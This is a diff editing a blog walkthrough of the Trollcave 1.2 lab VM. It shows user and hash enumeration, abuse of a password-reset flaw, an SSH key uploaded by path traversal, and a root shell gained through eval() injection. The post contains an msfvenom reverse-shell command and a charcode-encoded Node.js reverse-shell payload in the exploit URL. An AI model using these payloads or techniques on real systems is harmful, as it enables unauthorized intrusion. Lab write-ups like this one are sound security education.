@@ -1,6 +1,6 @@
 ---
 layout: post
-date: 2018-04-23 06:14:17 +0000  
+date: 2018-04-23 06:14:17 +0000
 title: "Don't Feed the Trolls"
 category: Walkthrough
 tags: [VulnHub, "Trollcave"]
@@ -18,7 +18,7 @@ This post documents the complete walkthrough of Trollcave: 1.2, a boot2root [VM]
 
 ### Background
 
-**Trollcave** is a vulnerable VM, in the tradition of [VulnHub][3] and [infosec wargames](https://en.wikipedia.org/wiki/Wargame_(hacking)) in general. You start with a virtual machine which you know nothing about – no usernames, no passwords. In this instance, you'll see a simple community blogging website with a bunch of users. From this initial point, you enumerate the machine's running services and general characteristics and devise ways to gain complete control over it by finding and exploiting vulnerabilities and misconfigurations.
+**Trollcave** is a vulnerable VM, in the tradition of [VulnHub][3] and [infosec wargames](https://en.wikipedia.org/wiki/Wargame_(hacking)) in general. You start with a virtual machine you know nothing about — no usernames, no passwords. In this instance, you see a simple community blogging website with a bunch of users. From this initial point, you determine the machine's running services and general characteristics, and devise ways to gain complete control over it by finding and exploiting vulnerabilities and misconfigurations.
 
 Your first goal is to abuse the services on the machine to gain unauthorized shell access. Your ultimate goal is to read a text file in the `root` user's home directory (`/root/flag.txt`).
 
@@ -44,13 +44,13 @@ PORT   STATE SERVICE REASON         VERSION
 |_http-title: Trollcave
 ```
 
-This is how the site looked like as rendered by the browser.
+This is how the site looks like in the browser.
 
 ![screenshot-1](/assets/images/posts/trollcave-walkthrough/screenshot-1.png)
 
 ### Directory/File Enumeration
 
-Let's find out more about the site with `wfuzz` and `big.txt` from [SecLists](https://github.com/danielmiessler/SecLists).
+Let's fuzz the site with `wfuzz` and `big.txt` from [SecLists](https://github.com/danielmiessler/SecLists) to look for directories and/or files.
 
 ```
 # wfuzz -w /usr/share/seclists/Discovery/Web-Content/big.txt --hc 404 -t 50 http://192.168.30.128/FUZZ
@@ -82,10 +82,10 @@ ID	Response   Lines      Word         Chars          Payload
 
 ### Ruby on Rails
 
-After navigating around the site for a bit, I noticed [REST](https://en.wikipedia.org/wiki/Representational_state_transfer)ful URLs which led me to believe this site is a Ruby on Rails (RoR) web application.
+I notice [REST](https://en.wikipedia.org/wiki/Representational_state_transfer)ful URLs during cursory browsing of the site, and I believe it's a Ruby on Rails (RoR) web application. The blog post at `/blogs/6` gives it away.
 
 ```
-# curl -s http://192.168.30.128/ | grep -Po '(href|src)=".{2,}"' | cut -d'"' -f2 | sort
+# curl -s http://192.168.30.128/ | grep -Po '(href|src)=".{2,}"' | cut -d'"' -f2 | sort | uniq
 /assets/640px-Troll_Warning-7609c691efcf3b8040566ae6a4ccc54c44f3cc1cb028a0eb8eebef8259fca7a6.jpg
 /assets/application-152e0b6420893f14eeb6f908ca26bc60cca1bf773cbe0cb0a493fe7541d77b7a.css
 /assets/application-88d4cbee7b3f8591b7ccf003c3923c922b1e3fef8487fb1f09c4fc434c1bcb3d.js
@@ -110,13 +110,11 @@ After navigating around the site for a bit, I noticed [REST](https://en.wikipedi
 /users/5
 ```
 
-Digging further, the blog post at `/blogs/6` gave it away.
-
 ![screenshot-2](/assets/images/posts/trollcave-walkthrough/screenshot-2.png)
 
 ### Enumerating Users
 
-I was able to enumerate the users of the site using nothing more than `curl` and a command-line JSON parser `jq`.
+I'm able to determine the users of the site using nothing more than `curl` and a command-line JSON parser `jq`.
 
 ```
 # curl -s 192.168.30.128/users/{1..20}.json | jq -raM
@@ -142,7 +140,7 @@ I was able to enumerate the users of the site using nothing more than `curl` and
 
 ### Enumerating Password Hashes
 
-Using the same technique against `/reports`, I was able to enumerate four password digest or hash.
+Using the same technique against `/reports`, I'm also able to get four password digests or hashes.
 
 ```
 # curl -s 192.168.30.128/reports/{1..20}.json | jq -jaM
@@ -182,69 +180,69 @@ Using the same technique against `/reports`, I was able to enumerate four passwo
 ...
 ```
 
-The passwords hashed with `bcrypt` had salt and a computational cost of 10 rounds, cracking them would be a futile exercise and a waste of CPU cycles. We need a better way.
+The `bcrypt` hashes have salt and a computational cost of 10 rounds; cracking them is a futile exercise and a waste of CPU cycles. We need a better way.
 
 ### Password Reset
 
-Recall the blog post above on `password_resets`? Turned out that the well-received Ruby on Rails [tutorial](https://www.railstutorial.org/book) had a [chapter](https://www.railstutorial.org/book/password_reset) on it and provided a clue on how to proceed.
+Recall the blog post above on `password_resets`? Turns out that the well-received Ruby on Rails [tutorial](https://www.railstutorial.org/book) has a [chapter](https://www.railstutorial.org/book/password_reset) on it, and provides a clue on how to proceed.
 
 ![screenshot-3](/assets/images/posts/trollcave-walkthrough/screenshot-3.png)
 
-Using the URL `/password_resets/new`, I was able to navigate to the password reset page.
+I'm able to navigate to the password reset page by going to `/password_resets/new`.
 
 ![screenshot-4](/assets/images/posts/trollcave-walkthrough/screenshot-4.png)
 
-The initial attempt to reset King's password (**Superadmin**) failed because password reset was for normal members. Well, let's reset the password of an ordinary member and see what happens.
+The initial attempt to reset King's password (**Superadmin**) fails because password reset is for normal members. Well, let's reset the password of an ordinary member and see what happens.
 
-As described in the blog post, the mailer had an issue resulting in the password reset URL presenting itself like so.
+According to the blog post, the mailer has an issue resulting in the password reset URL presenting itself like so.
 
 ![screenshot-5](/assets/images/posts/trollcave-walkthrough/screenshot-5.png)
 
-Noticed the username in the password reset URL? We could abuse it to reset the King's password.
+Notice the username in the password reset URL? Let's abuse it to reset the King's password.
 
 ![screenshot-6](/assets/images/posts/trollcave-walkthrough/screenshot-6.png)
 
 ![screenshot-7](/assets/images/posts/trollcave-walkthrough/screenshot-7.png)
 
-Boom. I'm the King (**Superadmin**) now :crown:
+I'm the King (**Superadmin**) :crown: now.
 
 ### File Manager
 
-The sight of **File manager** caught my attention since that's a pretty common way of putting files under the attacker's control into the environment.
+I look at the **File manager** with interest since that's the common way of putting files under the attacker's control into the environment — through file upload.
 
-The first file that I tried to upload was some random text to see if there's any kind of filtering in place.
+The first file I try to upload is some random text; I want to see if there's any kind of filtering in place.
 
 ![screenshot-8](/assets/images/posts/trollcave-walkthrough/screenshot-8.png)
 
-The first obstacle I encountered - not being able to upload anything. Well, I'm the **Superadmin** remember? I could go to the **Admin panel** to enable it.
+I encounter the first obstacle — can't upload. Well, I'm the **Superadmin** remember? I can go to the **Admin panel** to enable it.
 
 ![screenshot-9](/assets/images/posts/trollcave-walkthrough/screenshot-9.png)
 
-Now that I'm able to upload files, what kind of file should I upload? RoR is not PHP and there's no point in uploading `.rb` files if you knew the directory structure of a RoR application.
+Now that I'm able to upload files, what kind of file do I upload? RoR is not PHP and there's no point in uploading `.rb` files if you know the directory structure of a RoR application.
 
 ![screenshot-10](/assets/images/posts/trollcave-walkthrough/screenshot-10.png)
 
-Let's see what happens when I upload a text file for a start.
+Let's see what happens when I upload a text file.
 
 ![screenshot-11](/assets/images/posts/trollcave-walkthrough/screenshot-11.png)
 
-Once I've uploaded the file, I was able to view the file information by going to `/user_files/[file_number]` or `/user_files/[file_number].json` like this.
+Once I've uploaded the file, I'm able to view the file information by going to `/user_files/[file_number]` or `/user_files/[file_number].json`.
 
 ![screenshot-12](/assets/images/posts/trollcave-walkthrough/screenshot-12.png)
 
-Now that we know the file's absolute path, we can start to explore how to exploit this. At the upload page, we saw that we can also provide an alternative file name. Could this be the ticket in?
+Now that we know the file's absolute path, we can start to think about exploitation. At the upload page, we see that we can also provide an alternative file name. Is this our ticket in?
 
-When I gained access to **Superadmin** , I unlocked more blog posts and I saw a particular blog post and comment that could potentially be the key information to gaining access.
+When I gain access to **Superadmin** , I unlock more blog posts and I see a particular blog post and comment that may potentially be the key information to gaining access.
 
-_User `rails` is present. SSH is possible?_
+_Image shows user `rails` is present._
 
 ![screenshot-13](/assets/images/posts/trollcave-walkthrough/screenshot-13.png)
 
-_File upload is vulnerable?_
+_Image shows file upload is vulnerable._
 
 ![screenshot-14](/assets/images/posts/trollcave-walkthrough/screenshot-14.png)
 
-Looking at the above information, perhaps we could make use of the file upload vulnerability to upload a SSH public key I control to `/home/rails/.ssh/authorized_keys`?
+As we look at the above information, perhaps we can make use of the file upload vulnerability to upload a SSH public key I control to `/home/rails/.ssh/authorized_keys`?
 
 First, let's generate a SSH keypair (RSA) with `ssh-keygen`
 
@@ -276,7 +274,7 @@ Next, we upload `trollcave.pub` to `/home/rails/.ssh/authorized_keys` with a tra
 
 ![screenshot-15](/assets/images/posts/trollcave-walkthrough/screenshot-15.png)
 
-Let's verify that I've uploaded the public key.
+Let's verify the upload of the public key.
 
 ![screenshot-16](/assets/images/posts/trollcave-walkthrough/screenshot-16.png)
 
@@ -290,19 +288,19 @@ Awesome.
 
 ### Node.js
 
-During enumeration, I noticed a service running at `tcp/8888`.
+I notice a service running at `tcp/8888` during enumeration.
 
 ![screenshot-18](/assets/images/posts/trollcave-walkthrough/screenshot-18.png)
 
-It turned out to be Node.js running some sort of calculator application for King.
+It turns out to be Node.js running some sort of calculator application for King.
 
 ![screenshot-20](/assets/images/posts/trollcave-walkthrough/screenshot-20.png)
 
-If I've to guess, I'd say this is the way to gain `root` privileges because King is on the `sudoers` list.
+If I've to guess, I say this is the way to gain `root` privileges because King is on the `sudoers` list.
 
 ![screenshot-19](/assets/images/posts/trollcave-walkthrough/screenshot-19.png)
 
-It's interesting to note that this application is using `eval()` which further led me to believe this is our golden ticket.
+It's interesting to note that this application is using `eval()`, which I believe firmly is our golden ticket.
 
 ![screenshot-21](/assets/images/posts/trollcave-walkthrough/screenshot-21.png)
 
@@ -310,18 +308,16 @@ According to [MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Refer
 
 >The argument of the `eval()` function is a string. If the string represents an expression, `eval()` evaluates the expression. If the argument represents one or more JavaScript statements, `eval()` evaluates the statements. Do not call `eval()` to evaluate an arithmetic expression; JavaScript evaluates arithmetic expressions automatically.
 
-One small caveat. Noticed `toString()` after `eval()`? We need to make sure the evaluation returned a string!
-
-Good thing `msfvenom` was able to generate a Node.js reverse shell payload.
+Good thing `msfvenom` is able to generate a reverse shell payload for Node.js, but notice `toString()` after `eval()`? We need to make sure the evaluation returns a string so that `toString()` has something to do.
 
 ```
 # msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.30.128 LPORT=44444 -o rev.js
 # echo '1+1;' >> rev.js  <-- this is to make sure toString() has something to do ;)
 ```
 
-We also need to ensure that our payload is a string. To do that, we could encode our payload into ordinal numbers and piece them back together with `String.fromCharCode()`.
+We also need to ensure that our payload is a string. To do that, we can encode our payload into ordinal numbers and piece them back together with `String.fromCharCode()`.
 
-The following Python code did that.
+The following Python code does that.
 
 {% highlight python linenos %}
 # cat encode.py
@@ -334,7 +330,7 @@ for c in f.read():
 print 'eval(String.fromCharCode(%s))' % encoded[1:]
 {% endhighlight %}
 
-All that's left is to forward local port `tcp/9999` to remote port `tcp/8888` so that I can access it from my browser.
+All that's left to do is to forward local port `tcp/9999` to remote port `tcp/8888` so that I can access it from the browser.
 
 ```
 # ssh -L9999:localhost:8888 -i /root/keys/trollcave rails@192.168.30.130 -f -N
@@ -342,13 +338,13 @@ All that's left is to forward local port `tcp/9999` to remote port `tcp/8888` so
 
 ![screenshot-22](/assets/images/posts/trollcave-walkthrough/screenshot-22.png)
 
-The final exploit URL looked like this.
+The final exploit URL looks like this.
 
 ```
 http://localhost:9999/calc?sum=eval(String.fromCharCode(32,40,102,117,110,99,116,105,111,110,40,41,123,32,118,97,114,32,114,101,113,117,105,114,101,32,61,32,103,108,111,98,97,108,46,114,101,113,117,105,114,101,32,124,124,32,103,108,111,98,97,108,46,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,99,111,110,115,116,114,117,99,116,111,114,46,95,108,111,97,100,59,32,105,102,32,40,33,114,101,113,117,105,114,101,41,32,114,101,116,117,114,110,59,32,118,97,114,32,99,109,100,32,61,32,40,103,108,111,98,97,108,46,112,114,111,99,101,115,115,46,112,108,97,116,102,111,114,109,46,109,97,116,99,104,40,47,94,119,105,110,47,105,41,41,32,63,32,34,99,109,100,34,32,58,32,34,47,98,105,110,47,115,104,34,59,32,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,34,110,101,116,34,41,44,32,99,112,32,61,32,114,101,113,117,105,114,101,40,34,99,104,105,108,100,95,112,114,111,99,101,115,115,34,41,44,32,117,116,105,108,32,61,32,114,101,113,117,105,114,101,40,34,117,116,105,108,34,41,44,32,115,104,32,61,32,99,112,46,115,112,97,119,110,40,99,109,100,44,32,91,93,41,59,32,118,97,114,32,99,108,105,101,110,116,32,61,32,116,104,105,115,59,32,118,97,114,32,99,111,117,110,116,101,114,61,48,59,32,102,117,110,99,116,105,111,110,32,83,116,97,103,101,114,82,101,112,101,97,116,40,41,123,32,99,108,105,101,110,116,46,115,111,99,107,101,116,32,61,32,110,101,116,46,99,111,110,110,101,99,116,40,52,52,52,52,52,44,32,34,49,57,50,46,49,54,56,46,51,48,46,49,50,56,34,44,32,102,117,110,99,116,105,111,110,40,41,32,123,32,99,108,105,101,110,116,46,115,111,99,107,101,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,32,105,102,32,40,116,121,112,101,111,102,32,117,116,105,108,46,112,117,109,112,32,61,61,61,32,34,117,110,100,101,102,105,110,101,100,34,41,32,123,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,125,32,101,108,115,101,32,123,32,117,116,105,108,46,112,117,109,112,40,115,104,46,115,116,100,111,117,116,44,32,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,117,116,105,108,46,112,117,109,112,40,115,104,46,115,116,100,101,114,114,44,32,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,125,32,125,41,59,32,115,111,99,107,101,116,46,111,110,40,34,101,114,114,111,114,34,44,32,102,117,110,99,116,105,111,110,40,101,114,114,111,114,41,32,123,32,99,111,117,110,116,101,114,43,43,59,32,105,102,40,99,111,117,110,116,101,114,60,61,32,49,48,41,123,32,115,101,116,84,105,109,101,111,117,116,40,102,117,110,99,116,105,111,110,40,41,32,123,32,83,116,97,103,101,114,82,101,112,101,97,116,40,41,59,125,44,32,53,42,49,48,48,48,41,59,32,125,32,101,108,115,101,32,112,114,111,99,101,115,115,46,101,120,105,116,40,41,59,32,125,41,59,32,125,32,83,116,97,103,101,114,82,101,112,101,97,116,40,41,59,32,125,41,40,41,59,49,43,49,59,10))`
 ```
 
-On my `netcat` listener, this is what I got.
+On my `netcat` listener, a `root` shell returns.
 
 ![screenshot-23](/assets/images/posts/trollcave-walkthrough/screenshot-23.png)
 
@@ -356,7 +352,7 @@ On my `netcat` listener, this is what I got.
 
 ### Afterthought
 
-This was the perfect opportunity to explore [Ruby on Rails](https://en.wikipedia.org/wiki/Ruby_on_Rails) and [Node.js](https://en.wikipedia.org/wiki/Node.js). I've heard positive reviews from the **webdev** community (not that I'm using them professionally) but never got the chance to dig deeper until now.
+This was the perfect opportunity to explore [Ruby on Rails](https://en.wikipedia.org/wiki/Ruby_on_Rails) and [Node.js](https://en.wikipedia.org/wiki/Node.js). I've heard positive reviews from the **webdev** community (not that I'm using them professionally) but never got the chance to go deeper until now.
 
 I rate this VM highly educational and fun.
 
